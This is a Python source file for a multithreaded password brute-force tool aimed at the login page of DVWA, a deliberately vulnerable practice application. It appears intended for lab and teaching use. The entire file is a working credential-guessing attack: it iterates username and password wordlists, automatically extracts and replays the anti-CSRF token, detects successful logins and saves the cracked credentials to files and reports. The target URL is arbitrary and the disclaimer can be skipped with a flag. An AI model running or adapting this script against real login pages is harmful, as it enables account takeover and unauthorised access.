#!/usr/bin/env python3
"""
DVWA Brute Force Tool — 安全加固版本
======================================
针对 DVWA (Damn Vulnerable Web Application) Brute Force 模块的
多线程暴力破解测试工具。

安全加固内容：
  - Cookie 支持从环境变量 DVWA_COOKIE 或配置文件读取，不再只能通过 CLI 明文传入
  - 所有异常具体捕获并写入审计日志
  - 共享状态使用 threading.Lock 保护
  - 可配置请求速率限制 (--delay)
  - 所有外部输入进行格式和范围校验
  - logging 模块记录完整审计日志
  - 启动时显示授权声明并要求用户确认
  - 支持 DVWA 安全等级适配 (low / medium / high)
  - 支持生成 JSON / HTML 格式结果报告

用法示例:
  python dvwa_brute.py -u "http://127.0.0.1/dvwa/vulnerabilities/brute/" \
      -user "admin" -w "password.txt" --level low
"""

import requests
import threading
import queue
import time
import sys
import argparse
import os
import logging
import re
import json
from datetime import datetime
from pathlib import Path

# ============================================================
# 配置常量
# ============================================================
REQUEST_TIMEOUT = 10                # HTTP 请求超时（秒）
THREAD_SLEEP_INTERVAL = 0.05       # 线程内部轮询间隔（秒）
LOGIN_BUTTON_NAME = "Login"        # DVWA 登录按钮参数名
RESULT_FILE = "result.txt"         # 成功结果输出文件
DEFAULT_USERNAME_FILE = "username.txt"  # 默认用户名词典
LOG_FILE = "dvwa_brute.log"        # 审计日志文件
MAX_THREADS = 50                   # 最大线程数限制
MIN_THREADS = 1                    # 最小线程数
COOKIE_ENV_VAR = "DVWA_COOKIE"     # Cookie 环境变量名
AUTH_CONFIRM_TEXT = "yes"          # 授权确认文字

# DVWA 不同语言版本的检测标志
SUCCESS_FLAGS = [
    "Welcome to the password protected area",   # English
    "欢迎进入密码保护区域",                       # Chinese
]
FAIL_FLAGS = [
    "Username and/or password incorrect",        # English
    "用户名和/或密码不正确",                       # Chinese
]

# DVWA 安全等级对应的 user_token 参数名
LEVEL_TOKEN_PARAM = {
    "low": None,
    "medium": None,
    "high": "user_token",
}

# ============================================================
# 审计日志配置
# ============================================================
def setup_logging(log_file: str = LOG_FILE) -> logging.Logger:
    """配置审计日志：同时输出到控制台和文件。

    Args:
        log_file: 日志文件路径

    Returns:
        配置完成的 Logger 实例
    """
    logger = logging.getLogger("dvwa_brute")
    logger.setLevel(logging.DEBUG)

    # 避免重复添加 handler
    if logger.handlers:
        return logger

    # 文件 handler — 记录完整审计信息
    file_handler = logging.FileHandler(log_file, encoding="utf-8")
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        "%(asctime)s | %(levelname)-8s | %(threadName)-14s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    file_handler.setFormatter(file_formatter)
    logger.addHandler(file_handler)

    # 控制台 handler — 只显示 INFO 及以上
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_formatter = logging.Formatter(
        "[%(levelname)-5s] %(message)s"
    )
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)

    return logger


logger = setup_logging()


# ============================================================
# 输入校验函数
# ============================================================
def validate_url(url: str) -> bool:
    """校验 URL 格式是否合法。

    Args:
        url: 待校验的 URL 字符串

    Returns:
        是否合法
    """
    if not url:
        return False
    pattern = re.compile(
        r"^https?://"
        r"[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?"
        r"(\.[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*"
        r"(:\d{1,5})?"
        r"(/.*)?$"
    )
    return bool(pattern.match(url))


def validate_threads(threads: int) -> bool:
    """校验线程数是否在合法范围内。

    Args:
        threads: 线程数

    Returns:
        是否合法
    """
    return MIN_THREADS <= threads <= MAX_THREADS


def validate_file_path(path: str) -> bool:
    """校验文件路径是否存在且不为空。

    Args:
        path: 文件路径

    Returns:
        是否合法
    """
    try:
        p = Path(path)
        if not p.exists():
            return False
        if not p.is_file():
            return False
        if p.stat().st_size == 0:
            return False
        return True
    except (OSError, PermissionError) as e:
        logger.error("文件路径校验失败: %s — %s", path, e)
        return False


def validate_delay(delay: float) -> bool:
    """校验请求延迟是否在合法范围内。

    Args:
        delay: 请求间隔（秒）

    Returns:
        是否合法
    """
    return 0.0 <= delay <= 10.0


def sanitize_cookie_for_log(cookie: str) -> str:
    """脱敏 Cookie，只保留前 8 个字符用于日志。

    Args:
        cookie: 原始 Cookie 字符串

    Returns:
        脱敏后的字符串
    """
    if not cookie:
        return "<empty>"
    if len(cookie) <= 8:
        return cookie[:4] + "***"
    return cookie[:8] + "***"


# ============================================================
# 授权确认
# ============================================================
def show_disclaimer() -> bool:
    """显示使用授权声明并要求用户确认。

    Returns:
        True 表示用户确认，False 表示用户拒绝
    """
    disclaimer = """
╔══════════════════════════════════════════════════════════════╗
║                 DVWA 暴力破解测试工具 — 安全加固版               ║
║                                                              ║
║  警告：本工具仅限在已获授权的 DVWA 靶场环境中使用。                ║
║  未经授权对非自有系统使用本工具属于违法行为。                      ║
║                                                              ║
║  使用本工具即表示您确认：                                       ║
║  1. 您已获得对目标系统的书面授权测试许可。                        ║
║  2. 您将遵守适用法律法规。                                      ║
║  3. 您对使用本工具产生的后果承担全部责任。                        ║
║                                                              ║
║  所有请求将被记录到审计日志: dvwa_brute.log                      ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(disclaimer)
    try:
        answer = input("请输入 'yes' 确认您已获得授权: ").strip()
        if answer.lower() == AUTH_CONFIRM_TEXT:
            logger.info("用户已确认授权声明")
            return True
        else:
            logger.warning("用户拒绝授权声明，程序退出")
            print("未确认授权，程序退出。")
            return False
    except (EOFError, KeyboardInterrupt):
        print("\n程序已取消。")
        return False


# ============================================================
# 报告生成
# ============================================================
def generate_report(
    report_format: str,
    target_url: str,
    level: str,
    username: str,
    password: str,
    total_attempts: int,
    elapsed: float,
    found: bool,
    thread_count: int,
    delay: float,
) -> str:
    """生成测试结果报告。

    Args:
        report_format: 报告格式 ('json' 或 'html')
        target_url: 目标 URL
        level: DVWA 安全等级
        username: 破解成功的用户名
        password: 破解成功的密码
        total_attempts: 总尝试次数
        elapsed: 耗时（秒）
        found: 是否破解成功
        thread_count: 使用的线程数
        delay: 请求间隔

    Returns:
        报告文件路径，如果未生成则返回空字符串
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "timestamp": datetime.now().isoformat(),
        "target_url": target_url,
        "security_level": level,
        "success": found,
        "username": username if found else None,
        "password": password if found else None,
        "total_attempts": total_attempts,
        "elapsed_seconds": round(elapsed, 2),
        "threads": thread_count,
        "delay": delay,
    }

    if report_format == "json":
        filename = f"report_{timestamp}.json"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(result, f, ensure_ascii=False, indent=2)
            logger.info("JSON 报告已生成: %s", filename)
            return filename
        except OSError as e:
            logger.error("生成 JSON 报告失败: %s", e)
            return ""

    elif report_format == "html":
        filename = f"report_{timestamp}.html"
        status_color = "#27ae60" if found else "#e74c3c"
        status_text = "破解成功" if found else "破解失败"
        html_content = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>DVWA 暴力破解测试报告</title>
    <style>
        body {{ font-family: -apple-system, 'Microsoft YaHei', sans-serif;
               max-width: 720px; margin: 40px auto; padding: 20px;
               background: #f5f6fa; color: #2c3e50; }}
        h1 {{ color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
        .card {{ background: white; border-radius: 8px; padding: 20px;
                 margin: 16px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }}
        .status {{ display: inline-block; padding: 4px 16px; border-radius: 20px;
                   color: white; background: {status_color}; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td {{ padding: 8px 12px; border-bottom: 1px solid #ecf0f1; }}
        td:first-child {{ font-weight: 600; width: 160px; color: #7f8c8d; }}
        .footer {{ text-align: center; color: #bdc3c7; font-size: 12px; margin-top: 30px; }}
    </style>
</head>
<body>
    <h1>DVWA 暴力破解测试报告</h1>
    <div class="card">
        <p style="text-align:center"><span class="status">{status_text}</span></p>
        <table>
            <tr><td>测试时间</td><td>{result['timestamp']}</td></tr>
            <tr><td>目标 URL</td><td>{result['target_url']}</td></tr>
            <tr><td>安全等级</td><td>{result['security_level']}</td></tr>
            <tr><td>线程数</td><td>{result['threads']}</td></tr>
            <tr><td>请求间隔</td><td>{result['delay']} 秒</td></tr>
            <tr><td>总尝试次数</td><td>{result['total_attempts']}</td></tr>
            <tr><td>耗时</td><td>{result['elapsed_seconds']} 秒</td></tr>
            {"<tr><td>破解用户名</td><td>" + result['username'] + "</td></tr>" if found else ""}
            {"<tr><td>破解密码</td><td>" + result['password'] + "</td></tr>" if found else ""}
        </table>
    </div>
    <div class="footer">DVWA Brute Force Tool — 安全加固版 | 仅供授权测试使用</div>
</body>
</html>"""
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(html_content)
            logger.info("HTML 报告已生成: %s", filename)
            return filename
        except OSError as e:
            logger.error("生成 HTML 报告失败: %s", e)
            return ""

    else:
        logger.error("不支持的报告格式: %s", report_format)
        return ""


# ============================================================
# BruteForcer 类（安全加固版）
# ============================================================
class BruteForcer:
    """DVWA 暴力破解器 — 安全加固版。

    相比原始版本的安全改进：
    - 共享状态 self.found 使用 threading.Lock 保护
    - 具体异常捕获并记录审计日志
    - 可配置的请求速率限制
    - 支持 DVWA 多安全等级适配
    """

    def __init__(
        self,
        url: str,
        cookie: str,
        user,
        wordlist: str,
        threads: int = 5,
        delay: float = 0.1,
        level: str = "low",
        success_flags: list = None,
        fail_flags: list = None,
    ):
        """初始化暴力破解器。

        Args:
            url: DVWA Brute Force 模块 URL
            cookie: 认证 Cookie 字符串
            user: 单个用户名字符串或用户名列表
            wordlist: 密码字典文件路径
            threads: 并发线程数（1-50）
            delay: 每次请求间隔（秒，0.0-10.0）
            level: DVWA 安全等级（low/medium/high）
            success_flags: 自定义成功标志列表
            fail_flags: 自定义失败标志列表
        """
        self.url = url
        self.headers = {"Cookie": cookie}
        self.user = user
        self.wordlist = wordlist
        self.threads = threads
        self.delay = delay
        self.level = level.lower()
        self.success_flags = success_flags or SUCCESS_FLAGS
        self.fail_flags = fail_flags or FAIL_FLAGS

        self.q = queue.Queue()
        self.found = False
        self.found_lock = threading.Lock()       # 保护 self.found 的互斥锁
        self.found_user = None                   # 破解成功的用户名
        self.found_pass = None                   # 破解成功的密码
        self.total_attempts = 0
        self.attempt_lock = threading.Lock()     # 保护计数器的互斥锁

        # 日志脱敏
        cookie_safe = sanitize_cookie_for_log(cookie)
        logger.info(
            "初始化 BruteForcer | URL=%s | 线程=%d | 延迟=%.2fs | 等级=%s | Cookie=%s",
            url, threads, delay, self.level, cookie_safe,
        )

    def _fetch_csrf_token(self) -> str:
        """从 DVWA high 等级页面获取 CSRF token（user_token）。

        Returns:
            user_token 字符串，获取失败返回空字符串
        """
        try:
            r = requests.get(
                self.url,
                headers=self.headers,
                timeout=REQUEST_TIMEOUT,
            )
            # 从 HTML 中提取 hidden input user_token 的值
            match = re.search(
                r'<input\s+type=[\'"]hidden[\'"]\s+name=[\'"]user_token[\'"]\s+value=[\'"]([^\'"]+)[\'"]',
                r.text,
            )
            if match:
                token = match.group(1)
                logger.debug("获取 user_token: %s", token[:8] + "***" if len(token) > 8 else token)
                return token
            else:
                logger.warning("未能从页面提取 user_token（等级=%s），尝试无 token 请求", self.level)
                return ""
        except requests.RequestException as e:
            logger.error("获取 CSRF token 失败: %s", e)
            return ""

    def load_tasks(self):
        """加载密码字典和用户名，生成爆破任务队列。

        安全改进：具体异常捕获，错误信息记录日志。

        Raises:
            SystemExit: 字典文件为空或读取失败时退出
        """
        pass_list = []
        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    p = line.strip()
                    if p:
                        pass_list.append(p)
        except FileNotFoundError:
            logger.critical("密码字典文件不存在: %s", self.wordlist)
            sys.exit(1)
        except PermissionError:
            logger.critical("无权限读取密码字典文件: %s", self.wordlist)
            sys.exit(1)
        except OSError as e:
            logger.critical("读取密码字典文件失败: %s — %s", self.wordlist, e)
            sys.exit(1)

        if not pass_list:
            logger.critical("密码字典文件为空: %s", self.wordlist)
            sys.exit(1)

        # 确定用户名列表
        if isinstance(self.user, list):
            user_list = self.user
        else:
            user_list = [self.user]

        if not user_list:
            logger.critical("用户名列表为空")
            sys.exit(1)

        # 生成笛卡尔积任务
        for u in user_list:
            for p in pass_list:
                self.q.put((u, p))

        task_count = self.q.qsize()
        logger.info(
            "任务加载完成 | 用户数=%d | 密码数=%d | 总组合数=%d",
            len(user_list), len(pass_list), task_count,
        )
        print(f"用户名密码组合数: {task_count}")
        print(f"线程数: {self.threads} | 请求间隔: {self.delay}s | 安全等级: {self.level}")
        print("开始爆破...")

    def worker(self):
        """工作线程函数 — 安全加固版。

        安全改进：
        - 具体异常捕获（requests.RequestException, queue.Empty）
        - 使用 found_lock 保护共享状态
        - 使用 attempt_lock 保护计数器
        - 每次请求后按 delay 限速
        - 审计日志记录关键事件
        """
        thread_name = threading.current_thread().name
        logger.debug("工作线程启动: %s", thread_name)

        while True:
            # 先检查是否已被其他线程找到
            with self.found_lock:
                if self.found:
                    break

            try:
                user, pwd = self.q.get_nowait()
            except queue.Empty:
                break

            # 在 DVWA high 等级下获取 CSRF token
            csrf_token = None
            if LEVEL_TOKEN_PARAM.get(self.level):
                csrf_token = self._fetch_csrf_token()

            # 构建请求参数
            params = {
                "username": user,
                "password": pwd,
                LOGIN_BUTTON_NAME: LOGIN_BUTTON_NAME,
            }
            if csrf_token:
                params["user_token"] = csrf_token

            try:
                logger.debug("尝试 | user=%s | pass=%s", user, pwd)
                r = requests.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    timeout=REQUEST_TIMEOUT,
                )

                # 检查成功标志
                hit = any(flag in r.text for flag in self.success_flags)

                with self.attempt_lock:
                    self.total_attempts += 1

                if hit:
                    with self.found_lock:
                        if not self.found:
                            self.found = True
                            self.found_user = user
                            self.found_pass = pwd

                            print("\n破解成功！")
                            print("user:", user)
                            print("password:", pwd)

                            # 写入结果文件（原子化）
                            try:
                                with open(RESULT_FILE, "w", encoding="utf-8") as f:
                                    f.write(f"username:{user}\npassword:{pwd}\n")
                                logger.info(
                                    "结果已写入 %s | user=%s",
                                    RESULT_FILE, user,
                                )
                            except OSError as e:
                                logger.error("写入结果文件失败: %s", e)

                    self.q.task_done()
                    break

            except requests.ConnectionError as e:
                logger.error("网络连接错误 (%s:%s): %s", user, pwd, e)
            except requests.Timeout as e:
                logger.warning("请求超时 (%s:%s): %s", user, pwd, e)
            except requests.RequestException as e:
                logger.error("请求异常 (%s:%s): %s", user, pwd, e)

            self.q.task_done()

            # 速率限制
            if self.delay > 0:
                time.sleep(self.delay)

        logger.debug("工作线程结束: %s", thread_name)

    def run(self):
        """启动暴力破解主流程。

        安全改进：
        - 使用 try/finally 确保日志正确关闭
        - 记录总耗时和尝试次数
        """
        self.load_tasks()

        start_time = time.time()

        t_list = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self.worker,
                name=f"Worker-{i+1}",
            )
            t.daemon = True
            t.start()
            t_list.append(t)

        for t in t_list:
            t.join()

        elapsed = time.time() - start_time
        logger.info(
            "爆破结束 | 耗时=%.2fs | 总尝试=%d | 结果=%s",
            elapsed,
            self.total_attempts,
            "成功" if self.found else "失败",
        )

        if self.found:
            print(f"\n耗时: {elapsed:.2f} 秒 | 总尝试次数: {self.total_attempts}")
        else:
            print(f"\n破解失败！耗时: {elapsed:.2f} 秒 | 总尝试次数: {self.total_attempts}")

        return elapsed


# ============================================================
# Cookie 读取：支持环境变量 > 配置文件 > 命令行参数
# ============================================================
def resolve_cookie(cli_cookie: str = None, cookie_file: str = None) -> str:
    """按优先级解析 Cookie：环境变量 > 配置文件 > 命令行参数。

    安全改进：CLI 不再作为唯一入口，支持安全配置方式。

    Args:
        cli_cookie: 命令行传入的 Cookie（最低优先级，会有警告）
        cookie_file: Cookie 配置文件路径

    Returns:
        解析出的 Cookie 字符串

    Raises:
        SystemExit: 所有方式均未获取到 Cookie 时退出
    """
    # 优先级 1: 环境变量
    env_cookie = os.getenv(COOKIE_ENV_VAR)
    if env_cookie:
        logger.info("Cookie 来源: 环境变量 %s", COOKIE_ENV_VAR)
        return env_cookie

    # 优先级 2: 配置文件
    if cookie_file:
        try:
            with open(cookie_file, "r", encoding="utf-8") as f:
                file_cookie = f.read().strip()
            if file_cookie:
                logger.info("Cookie 来源: 配置文件 %s", cookie_file)
                return file_cookie
            else:
                logger.warning("Cookie 配置文件为空: %s", cookie_file)
        except FileNotFoundError:
            logger.error("Cookie 配置文件不存在: %s", cookie_file)
        except PermissionError:
            logger.error("无权限读取 Cookie 配置文件: %s", cookie_file)
        except OSError as e:
            logger.error("读取 Cookie 配置文件失败: %s — %s", cookie_file, e)

    # 优先级 3: 命令行参数（不推荐，会打印警告）
    if cli_cookie:
        logger.warning(
            "Cookie 来源: 命令行参数（不推荐，可能出现在 Shell 历史中）。"
            "建议使用环境变量 %s 或 --cookie-file。",
            COOKIE_ENV_VAR,
        )
        return cli_cookie

    # 所有方式均失败
    logger.critical(
        "未提供 Cookie。请通过以下方式之一提供：\n"
        "  1. 环境变量: export %s='your_cookie'\n"
        "  2. 配置文件: --cookie-file cookie.txt\n"
        "  3. 命令行: -c 'your_cookie'（不推荐）",
        COOKIE_ENV_VAR,
    )
    sys.exit(1)


# ============================================================
# 命令行入口
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="DVWA 暴力破解测试工具 — 安全加固版",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python dvwa_brute.py -u "http://127.0.0.1/dvwa/vulnerabilities/brute/" \\
      -user "admin" -w "password.txt" --level low

  python dvwa_brute.py -u "http://127.0.0.1/dvwa/vulnerabilities/brute/" \\
      --cookie-file cookie.txt -w "password.txt" --level high -t 10 --delay 0.5

环境变量:
  DVWA_COOKIE    DVWA 会话 Cookie（推荐方式，优先级最高）
        """,
    )

    parser.add_argument(
        "-u", "--url", required=True,
        help="DVWA Brute Force 模块 URL",
    )
    parser.add_argument(
        "-c", "--cookie", default=None,
        help="认证 Cookie（不推荐，建议使用环境变量 DVWA_COOKIE 或 --cookie-file）",
    )
    parser.add_argument(
        "--cookie-file", default=None,
        help="从文件读取 Cookie（文件内容仅一行 Cookie 字符串）",
    )
    parser.add_argument(
        "-user", "--username", default=None,
        help="单个用户名或用户名字典文件路径（不指定则使用默认 username.txt）",
    )
    parser.add_argument(
        "-w", "--wordlist", required=True,
        help="密码字典文件路径",
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=5,
        help=f"并发线程数（{MIN_THREADS}-{MAX_THREADS}，默认 5）",
    )
    parser.add_argument(
        "--delay", type=float, default=0.1,
        help="每次请求间隔秒数（0.0-10.0，默认 0.1）",
    )
    parser.add_argument(
        "--level", choices=["low", "medium", "high"], default="low",
        help="DVWA 安全等级（默认 low）。high 等级会自动处理 CSRF token",
    )
    parser.add_argument(
        "--report", choices=["json", "html"], default=None,
        help="生成测试结果报告（json 或 html）",
    )
    parser.add_argument(
        "--log-file", default=LOG_FILE,
        help=f"审计日志文件路径（默认 {LOG_FILE}）",
    )
    parser.add_argument(
        "--skip-disclaimer", action="store_true",
        help="跳过授权声明（仅用于自动化测试，请勿滥用）",
    )

    args = parser.parse_args()

    # ---- 重新配置日志文件路径 ----
    global logger
    logger = setup_logging(args.log_file)

    # ---- 输入校验 ----
    if not validate_url(args.url):
        logger.critical("URL 格式不合法: %s", args.url)
        print("错误：URL 格式不合法，必须以 http:// 或 https:// 开头。")
        sys.exit(1)

    if not validate_threads(args.threads):
        logger.critical("线程数不合法: %d（范围 %d-%d）", args.threads, MIN_THREADS, MAX_THREADS)
        print(f"错误：线程数必须在 {MIN_THREADS}-{MAX_THREADS} 之间，收到 {args.threads}。")
        sys.exit(1)

    if not validate_delay(args.delay):
        logger.critical("请求间隔不合法: %.2f（范围 0.0-10.0）", args.delay)
        print("错误：请求间隔必须在 0.0-10.0 秒之间。")
        sys.exit(1)

    if not validate_file_path(args.wordlist):
        logger.critical("密码字典无效: %s", args.wordlist)
        print(f"错误：密码字典文件不存在或为空: {args.wordlist}")
        sys.exit(1)

    # ---- 授权声明 ----
    if not args.skip_disclaimer:
        if not show_disclaimer():
            sys.exit(0)

    # ---- Cookie 解析 ----
    cookie = resolve_cookie(args.cookie, args.cookie_file)

    # ---- 用户名解析 ----
    final_user = None
    if args.username:
        if os.path.isfile(args.username):
            try:
                with open(args.username, "r", encoding="utf-8", errors="ignore") as f:
                    final_user = [line.strip() for line in f if line.strip()]
                if not final_user:
                    logger.critical("用户名字典文件为空: %s", args.username)
                    print(f"错误：用户名字典文件为空: {args.username}")
                    sys.exit(1)
            except OSError as e:
                logger.critical("读取用户名字典失败: %s — %s", args.username, e)
                print(f"错误：读取用户名字典失败: {args.username}")
                sys.exit(1)
        else:
            final_user = args.username
    else:
        # 使用默认用户名字典
        if os.path.isfile(DEFAULT_USERNAME_FILE):
            try:
                with open(DEFAULT_USERNAME_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    final_user = [line.strip() for line in f if line.strip()]
                if not final_user:
                    logger.critical("默认用户名字典文件为空: %s", DEFAULT_USERNAME_FILE)
                    print(f"错误：默认用户名字典文件为空: {DEFAULT_USERNAME_FILE}")
                    sys.exit(1)
                logger.info("未指定用户名，已加载默认字典: %s", DEFAULT_USERNAME_FILE)
                print("未指定用户名，已加载默认 username.txt")
            except OSError as e:
                logger.critical("读取默认用户名字典失败: %s — %s", DEFAULT_USERNAME_FILE, e)
                print(f"错误：读取默认用户名字典失败: {DEFAULT_USERNAME_FILE}")
                sys.exit(1)
        else:
            logger.critical("未指定用户名且未找到默认字典: %s", DEFAULT_USERNAME_FILE)
            print(f"错误：未指定用户名且未找到 {DEFAULT_USERNAME_FILE}")
            sys.exit(1)

    # ---- 启动爆破 ----
    bf = BruteForcer(
        url=args.url,
        cookie=cookie,
        user=final_user,
        wordlist=args.wordlist,
        threads=args.threads,
        delay=args.delay,
        level=args.level,
    )

    elapsed = bf.run()

    # ---- 生成报告 ----
    if args.report:
        report_path = generate_report(
            report_format=args.report,
            target_url=args.url,
            level=args.level,
            username=bf.found_user,
            password=bf.found_pass,
            total_attempts=bf.total_attempts,
            elapsed=elapsed,
            found=bf.found,
            thread_count=args.threads,
            delay=args.delay,
        )
        if report_path:
            print(f"报告已生成: {report_path}")


if __name__ == "__main__":
    main()
